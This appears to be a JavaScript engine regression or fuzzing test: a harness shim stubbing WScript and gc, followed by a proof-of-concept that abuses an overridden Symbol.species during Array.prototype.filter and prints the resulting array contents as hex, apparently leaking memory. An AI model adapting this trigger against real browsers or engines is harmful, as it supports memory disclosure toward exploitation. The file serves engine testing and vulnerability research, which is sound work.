function gc() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
}

WScript = {
    _jscGC: gc,
    _jscPrint: console.log,
    _convertPathname : function(dosStylePath)
    {
        return dosStylePath.replace(/\\/g, "/");
    },
    Arguments : [ "summary" ],
    Echo : function()
    {
        WScript._jscPrint.apply(this, arguments);
    },
    LoadScriptFile : function(path)
    {
    },
    Quit : function()
    {
    },
    Platform :
    {
        "BUILD_TYPE": "Debug"
    }
};

function CollectGarbage()
{
    WScript._jscGC();
}

function $ERROR(e)
{
}

if (typeof(console) == "undefined") {
    console = {
        log: print
    };
}

if (typeof(gc) == "undefined") {
  gc = function() {
    for (let i = 0; i < 10; i++) {
      new ArrayBuffer(1024 * 1024 * 10);
    }
  }
}

if (typeof(BigInt) == "undefined") {
  BigInt = function (v) { return new Number(v); }
}

if (typeof(BigInt64Array) == "undefined") {
  BigInt64Array = function(v) { return new Array(v); }
}

if (typeof(BigUint64Array) == "undefined") { 
  BigUint64Array = function (v) { return new Array(v); }
}

if (typeof(quit) == "undefined") {
  quit = function() {
  }
}

var b = new Array(1, 2, 3);
var d = new Array(1, 2, 3);
d.length = 0x200000;
d.fill(7);

class dummy {
  constructor() {
    //alert("in constructor");
    return d;
  }

}

class MyArray extends Array {
  // Overwrite species to the parent Array constructor
  static get [Symbol.species]() {
    //alert("get");
    b[0] = {};
    return dummy;
  }

}

var a = new Array({}, [], "natalie", 7, 7, 7, 7, 7);

for (var i = 0; i < 0x200000; i++) {
  a[i] = i;
}

function test(i) {
  return true;
}

a.__proto__ = MyArray.prototype;
var o = a.filter(test); //alert(o);

var h = [];

for (item in o) {
  var n = new Number(o[item]);

  if (n < 0) {
    n = n + 0x100000000;
  }

  h.push(n.toString(16));
} //alert(h);
